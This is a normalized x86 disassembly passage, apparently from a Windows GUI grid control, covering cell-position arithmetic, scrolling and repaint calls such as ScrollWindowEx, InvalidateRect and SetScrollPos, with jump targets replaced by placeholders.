mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4228fc
retn
mov ecx esi
xor edx edx
mov eax ebx
call sub_42266c
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov edx eax
mov ecx esi
mov eax ebx
call sub_42260c
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_42266c
mov eax [ ebp - 0x4 ]
call sub_43f5f8
mov ecx eax
mov edx esi
mov eax ebx
call sub_42260c
sub_476d4c
push ebp
mov ebp esp
push esi
mov esi eax
mov al [ ebp + 0x8 ]
push eax
push 0x1
mov eax esi
call sub_4776f4
mov eax esi
call sub_479740
mov eax esi
mov si 0xffeb
call sub_403368
pop esi
pop ebp
retn 0x4
sub_476d78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
dec edx
sub edx eax
jl r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add esi eax
cmp esi [ ebx + 0xc ]
jle r-xdata
sub_476dd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_476d78
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ebx
mov edx esi
call sub_476d78
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi eax
mov eax [ ebx + 0x20 ]
dec eax
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
add eax [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
mov edx esi
call sub_476d78
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jge r-xdata
dec esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
sub_476eb0
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_476088
mov eax [ ebp - 0x68 ]
inc eax
mov esi [ ebp - 0x14 ]
cmp eax esi
jl r-xdata
mov eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x10 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
lea eax [ ebp - 0x78 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_476dd4
pop ecx
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
lea eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_476dd4
pop ecx
mov eax [ ebx + 0x208 ]
call sub_42271c
test al al
jne r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi ]
mov eax ebx
call sub_43f5b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax ebx
call sub_43f5b4
sub eax esi
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_476fa0
mov edx [ eax + 0x238 ]
mov [ eax + 0x258 ] edx
mov edx [ eax + 0x23c ]
mov [ eax + 0x25c ] edx
mov edx [ eax + 0x258 ]
mov [ eax + 0x228 ] edx
mov edx [ eax + 0x25c ]
mov [ eax + 0x22c ] edx
mov edx [ eax + 0x228 ]
mov [ eax + 0x210 ] edx
mov edx [ eax + 0x22c ]
mov [ eax + 0x214 ] edx
test [ eax + 0x249 ] 0x10
je r-xdata
retn
mov edx [ eax + 0x21c ]
dec edx
mov [ eax + 0x210 ] edx
sub_477000
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] edx
mov edx esp
mov eax esi
call sub_47702c
add esp 0x10
pop esi
retn
sub_47702c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_476eb0
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_446450
push eax
call InvalidateRect
sub_477074
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
pop ebp
retn
sub_47709c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
pop ebp
retn
sub_4770b8
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4762c0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x25c ]
sub eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x258 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_477118
push ebp
mov ebp esp
add esp 0xffffffa0
lea edx [ ebp - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_476088
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x25c ]
mov eax [ ebp - 0x20 ]
pop edx
sub eax edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x258 ]
mov eax [ ebp - 0x50 ]
pop edx
sub eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_47716c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x74 ]
cmp eax 0x7
ja r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
jmp [ eax * 4 + jump_table_47718c ]
sub ebx edi
jmp r-xdata
add ebx edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4770b8
pop ecx
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_477118
pop ecx
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_47709c
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_477074
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x74 ] 0x4
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_47709c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_477074
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_477074
pop ecx
add ebx eax
jmp r-xdata
dec edi
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_47709c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_477074
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_47709c
pop ecx
mov ebx eax
pop eax
sub ebx eax
jmp r-xdata
sub_4772a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x288 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x54 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4790fc
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43f5b4
mov edi eax
mov eax [ ebp + 0x8 ]
sub edi [ eax - 0x6c ]
mov eax esi
cmp eax 0x7
ja r-xdata
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_4772f7 ]
mov eax [ ebp - 0x8 ]
sub eax edi
cmp ebx eax
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_42282c
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_42282c
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x288 ]
cmp ebx eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
cmp esi 0x4
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x288 ] ebx
mov edx eax
sub edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
call sub_477adc
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x18 ]
call sub_47702c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_477c88
mov eax [ ebp + 0x8 ]
push eax
call sub_47709c
pop ecx
mov ebx eax
sub ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
sub_477450
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0x80 ]
mov eax [ ebp - 0x8 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov [ ebp - 0x78 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] 0xffffffff
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_476088
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffb8
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4762c0
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ edi ] edx
mov edx [ eax + 0x25c ]
mov [ edi + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
mov ebx esi
push ebp
mov edx 0x1
mov eax esi
call sub_47716c
pop ecx
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
mov esi [ edi + 0x4 ]
cmp eax esi
jge r-xdata
mov esi [ edi ]
mov ebx esi
push ebp
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_47716c
pop ecx
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
mov esi [ edi ]
cmp eax esi
jge r-xdata
push ebp
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call sub_4772a4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x10 ]
call sub_428c40
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
call sub_428c48
mov [ edi ] eax
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_428c40
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
call sub_428c48
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x258 ]
mov eax [ edi ]
cmp edx eax
jne r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ecx [ edi + 0x4 ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_47784c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x25c ]
cmp edx [ edi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_47911c
test eax eax
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4790fc
test eax eax
jg r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
sub_477638
push ebp
mov ebp esp
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp ecx [ edx ]
jne r-xdata
mov esi ecx
mov edi eax
cmp eax ecx
jge r-xdata
mov [ edx ] eax
jmp r-xdata
cmp esi [ edx ]
jg r-xdata
mov esi eax
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x4
cmp edi [ edx ]
jl r-xdata
cmp eax ecx
jge r-xdata
dec [ edx ]
inc [ edx ]
jmp r-xdata
sub_47766c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
push 0x1
push 0x1
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_4776f4
mov edx esp
mov eax ebx
call sub_47913c
mov eax [ esi ]
mov [ ebx + 0x210 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_4769b4
mov edx esp
mov eax ebx
call sub_4778b8
jmp r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_4776f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477839
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x20 ]
call sub_473ba0
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477840
lea eax [ ebp - 0x20 ]
call sub_403f40
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_47913c
mov eax [ ebx + 0x228 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x228 ] esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x22c ] eax
test [ ebx + 0x249 ] 0x20
jne r-xdata
cmp esi [ ebx + 0x21c ]
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_474fa8
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24c ]
jl r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
test [ ebx + 0x248 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xdc ]
test al al
je r-xdata
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x238 ]
mov [ ebx + 0x228 ] eax
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4778b8
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_477000
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_477000
lea edx [ ebx + 0x228 ]
mov eax ebx
call sub_4769b4
sub_47784c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x258 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x258 ] esi
mov [ ebx + 0x25c ] edi
mov edx esp
mov eax ebx
call sub_477b88
cmp edi [ ebx + 0x25c ]
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4778b8
push ebx
push esi
push edi
add esp 0xffffff90
mov ebx edx
mov edi eax
mov eax edi
call sub_446754
test al al
je r-xdata
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax edi
call sub_476eb0
push 0x1
lea edx [ esp + 0x64 ]
mov eax edi
call sub_47913c
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x14 ]
mov eax edi
call sub_476eb0
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
mov eax esp
call sub_473d1c
mov esi 0x4
lea ebx [ esp + 0x20 ]
push 0x0
push ebx
mov eax edi
call sub_446450
push eax
call InvalidateRect
add ebx 0x10
dec esi
jne r-xdata
sub_477930
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x2
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x8 ] 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
mov eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_416a60
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_446450
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_416a60
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_446450
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x4 ]
call sub_416a60
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_446450
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_416a60
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_446450
push eax
call ScrollWindowEx
jmp r-xdata
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_43f5b4
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_43f5b4
sub eax [ edi + 0xc ]
xor edx edx
pop ecx
call sub_416a60
neg [ ebp - 0x4 ]
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_416a60
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_47913c
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_47702c
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_446450
push eax
call ScrollWindowEx
jmp r-xdata
sub_477adc
push ebx
push esi
push edi
add esp 0xffffffa0
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_476088
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_477930
add esp 0x60
pop edi
pop esi
pop ebx
retn
sub_477b04
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi ] ecx
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
neg [ esi ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_477024
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ esi ] eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx + 0x4 ]
cmp eax [ esi ]
jge r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_477b88
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_477c88
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_476088
push ebp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebx ]
lea eax [ ebp - 0x70 ]
call sub_477b04
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_403368
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x25c ]
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x40 ]
call sub_477b04
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_477930
sub_477c08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
movzx esi di
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call GetScrollPos
cmp ebx eax
je r-xdata
test di di
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
push eax
call SetScrollPos
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x21c ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
